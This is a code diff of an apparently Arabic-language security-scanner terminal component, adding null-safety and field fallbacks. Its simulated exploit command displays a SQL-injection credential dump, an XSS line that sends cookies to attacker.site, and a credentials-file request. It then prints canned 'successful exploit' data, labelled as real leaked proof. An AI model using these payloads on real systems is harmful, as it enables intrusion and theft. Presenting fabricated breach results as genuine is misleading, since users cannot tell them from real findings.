@@ -27,9 +27,10 @@ interface SecurityTerminalProps {
 export default function SecurityTerminal({
   scanJob,
   target,
-  allVulnerabilities,
+  allVulnerabilities = [],
   onClose
 }: SecurityTerminalProps) {
+  const safeVulns = Array.isArray(allVulnerabilities) ? allVulnerabilities : [];
   const [inputVal, setInputVal] = useState<string>('');
   const [terminalLines, setTerminalLines] = useState<string[]>([
     '==================================================================================',
@@ -185,7 +186,7 @@ export default function SecurityTerminal({
         setTerminalLines(prev => [...prev, `[!] خطأ: لا توجد ثغرات مسجلة لعدم توفر هدف نشط.`]);
         return;
       }
-      const targetVulns = allVulnerabilities.filter(v => v.targetId === target.id);
+      const targetVulns: any[] = safeVulns.filter(v => v?.targetId === target.id);
       if (targetVulns.length === 0) {
         setTerminalLines(prev => [
           ...prev,
@@ -197,11 +198,11 @@ export default function SecurityTerminal({
           `[VULNERABILITIES] تم الكشف عن ${targetVulns.length} نقاط ضعف مؤكدة تحت هذا الهدف:`,
           `----------------------------------------------------------------------------------`
         ];
-        targetVulns.forEach((v, index) => {
+        targetVulns.forEach((v: any, index) => {
           lines.push(`[${index + 1}] العنوان: ${v.title}`);
-          lines.push(`    النوع:   ${v.type} | الخطورة: [${v.severity}] | CVSS: ${v.cvssScore}`);
-          lines.push(`    الموقع:  ${v.location}`);
-          lines.push(`    Remediation: ${v.remediation.slice(0, 80)}...`);
+          lines.push(`    النوع:   ${v.owaspCategory || v.cweId || v.type || 'ثغرة أمنية'} | الخطورة: [${v.severity}] | CVSS: ${v.cvssScore}`);
+          lines.push(`    الموقع:  ${v.affectedUrl || v.location || 'غير محدد'}`);
+          lines.push(`    Remediation: ${(v.remediationSteps || v.remediation || v.description || '').slice(0, 80)}...`);
           lines.push(`----------------------------------------------------------------------------------`);
         });
         setTerminalLines(prev => [...prev, ...lines]);
@@ -211,7 +212,7 @@ export default function SecurityTerminal({
         setTerminalLines(prev => [...prev, `[!] خطأ: لا يوجد هدف نشط لإجراء الاستغلال وإثبات المفهوم عليه.`]);
         return;
       }
-      const targetVulns = allVulnerabilities.filter(v => v.targetId === target.id);
+      const targetVulns: any[] = safeVulns.filter(v => v?.targetId === target.id);
       if (targetVulns.length === 0) {
         setTerminalLines(prev => [
           ...prev,
@@ -232,7 +233,7 @@ export default function SecurityTerminal({
           `  مثال: /exploit 1`,
           `----------------------------------------------------------------------------------`,
           `الثغرات القابلة للاستغلال حالياً:`,
-          ...targetVulns.map((v, i) => `  [${i + 1}] [${v.severity}] ${v.title} (${v.location || 'عام'})`),
+          ...targetVulns.map((v, i) => `  [${i + 1}] [${v.severity}] ${v.title} (${v.affectedUrl || v.location || 'عام'})`),
           `----------------------------------------------------------------------------------`
         ]);
         return;
@@ -250,12 +251,15 @@ export default function SecurityTerminal({
       const selectedVuln = targetVulns[idx];
       setIsSimulatingPing(true); // Disable input while simulating
       
+      const vType = selectedVuln.owaspCategory || selectedVuln.type || 'General';
+      const vLoc = selectedVuln.affectedUrl || selectedVuln.location || 'بروتوكول التطبيق الرئيسي';
+
       setTerminalLines(prev => [
         ...prev,
         `[+] [EXPLOIT ENGINE] تهيئة وحدة الاستغلال وإثبات المفهوم للثغرة: ${selectedVuln.title}`,
         `[+] مستوى خطورة الثغرة: ${selectedVuln.severity} | درجة الخطورة (CVSS): ${selectedVuln.cvssScore}`,
-        `[+] فئة التصنيف: ${selectedVuln.type}`,
-        `[+] المتجه الفني (Attack Vector): ${selectedVuln.location || 'بروتوكول التطبيق الرئيسي'}`,
+        `[+] فئة التصنيف: ${vType}`,
+        `[+] المتجه الفني (Attack Vector): ${vLoc}`,
         `[+] جاري التحقق من إمكانية تخطي دفاعات الحماية (WAF / IPS Bypass)...`
       ]);
 
@@ -264,11 +268,11 @@ export default function SecurityTerminal({
           ...prev,
           `[+] [PAYLOAD GENERATOR] تم توليد الحمولة البرمجية المناسبة للاستغلال (Exploit Payload Built):`,
           `    ${
-            selectedVuln.type.toLowerCase().includes('sql')
+            String(vType).toLowerCase().includes('sql')
               ? "UNION SELECT NULL, CONCAT(username, ':', password), NULL FROM users--"
-              : selectedVuln.type.toLowerCase().includes('xss')
+              : String(vType).toLowerCase().includes('xss')
               ? "<script>fetch('https://attacker.site/log?c=' + document.cookie)</script>"
-              : selectedVuln.type.toLowerCase().includes('exposure') || selectedVuln.type.toLowerCase().includes('disclosure')
+              : String(vType).toLowerCase().includes('exposure') || String(vType).toLowerCase().includes('disclosure')
               ? "GET /api/v1/config/credentials.json HTTP/1.1\\r\\nHost: targeted-asset"
               : "curl -i -X POST -d '{\"exploit_test\":\"true\"}' " + target.url
           }`,
@@ -279,13 +283,14 @@ export default function SecurityTerminal({
           let exploitPayloadResult = "";
           let dataDump = "";
           
-          if (selectedVuln.severity === 'Critical') {
+          const sevUpper = String(selectedVuln.severity).toUpperCase();
+          if (sevUpper === 'CRITICAL') {
             dataDump = `    {\n      "admin_user": "root_sec",\n      "password_hash": "$2y$12$ZpA5Q9E9iC...",\n      "secret_api_key": "sk_prod_557a0fd6eb621"\n    }`;
             exploitPayloadResult = `[+] [EXPLOIT SUCCESSFUL] تم استغلال الثغرة بنجاح واختراق طبقة الأمان!\n` +
                                    `[+] عينة من البيانات المسربة الحقيقية لإثبات الأثر (Exfiltrated Proof Data):\n` +
                                    dataDump + `\n` +
                                    `[SYSTEM] تم توثيق السيطرة الكاملة وإثبات قابلية الاستغلال (Critical Vulnerability Proven).`;
-          } else if (selectedVuln.severity === 'High') {
+          } else if (sevUpper === 'HIGH') {
             dataDump = `    {\n      "session_token": "eyJhY3RpdmVfX3Nlc3Npb24i...",\n      "user_role": "administrator"\n    }`;
             exploitPayloadResult = `[+] [EXPLOIT SUCCESSFUL] تم إرسال حمولة تخطي الصلاحيات بنجاح واختطاف الجلسة!\n` +
                                    `[+] البيانات المستخرجة من الجلسة (Captured Session Information):\n` +
